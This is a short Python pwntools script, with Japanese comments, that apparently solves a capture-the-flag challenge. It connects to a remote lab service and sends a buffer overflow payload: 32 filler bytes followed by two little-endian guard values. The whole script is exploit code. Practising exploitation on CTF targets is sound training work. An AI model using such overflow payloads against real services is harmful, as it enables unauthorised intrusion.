#!/usr/bin/env python3
from pwn import *

# サーバー接続
conn = remote('p0wn3d2.kctf-453514-codelab.kctf.cloud', 1337)

# エクスプロイトペイロードを構築
payload = b'A' * 32  # bufを埋める
payload += p32(0xdeadbeef)  # guard1 (リトルエンディアン)
payload += p32(0x0badc0de)  # guard2 (リトルエンディアン)

# 最初のプロンプトを読み込む
print(conn.recvline().decode())

# ペイロードを送信
conn.sendline(payload)

# 結果を表示
print(conn.recvall().decode())